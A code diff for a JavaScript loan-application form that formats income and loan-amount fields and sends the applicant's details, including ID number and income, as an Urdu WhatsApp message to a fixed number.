@@ -1,6 +1,6 @@
 document.addEventListener('DOMContentLoaded', function() {
-    // Constants
-    const TIMESTAMP = "2025-02-16 10:21:23";
+    // Constants - Updated with current timestamp
+    const TIMESTAMP = "2025-02-16 10:42:46";
     const USER = "AbdulManan-KB";
     const WHATSAPP_NUMBER = "923460408190";
 
@@ -60,6 +60,13 @@ document.addEventListener('DOMContentLoaded', function() {
         e.target.value = value;
     });
 
+    // Format currency input
+    const monthlyIncomeInput = document.getElementById('monthlyIncome');
+    monthlyIncomeInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        e.target.value = value;
+    });
+
     // Handle form submission
     if (form) {
         form.addEventListener('submit', function(e) {
@@ -73,6 +80,16 @@ document.addEventListener('DOMContentLoaded', function() {
                 return new Intl.NumberFormat('ur-PK').format(amount);
             }
 
+            // Get loan amount range text
+            function getLoanAmountText(value) {
+                const ranges = {
+                    "350001-500000": "3,50,001 - 5,00,000",
+                    "500001-750000": "5,00,001 - 7,50,000",
+                    "750001-1000000": "7,50,001 - 10,00,000"
+                };
+                return ranges[value] || value;
+            }
+
             // Create WhatsApp message
             const message = encodeURIComponent(`*خوشحالی مائیکروفنانس - نئی لون درخواست*\n
 ───────────────
@@ -81,11 +98,11 @@ document.addEventListener('DOMContentLoaded', function() {
 🆔 شناختی کارڈ نمبر: ${formData.get('cnic')}
 📱 فون نمبر: ${formData.get('phone')}
 💼 کاروبار کی قسم: ${formData.get('businessType')}
-💰 قرض کی رقم: ${formData.get('loanAmount')}
+💰 قرض کی رقم: ${getLoanAmountText(formData.get('loanAmount'))} روپے
 📍 کاروباری پتہ: ${formData.get('businessAddress')}
 💵 ماہانہ آمدنی: ${formatCurrency(formData.get('monthlyIncome'))} روپے
 ───────────────
-Submitted by: ${USER}`);
+درخواست دہندہ: ${USER}`);
 
             // Open WhatsApp
             window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${message}`, '_blank');
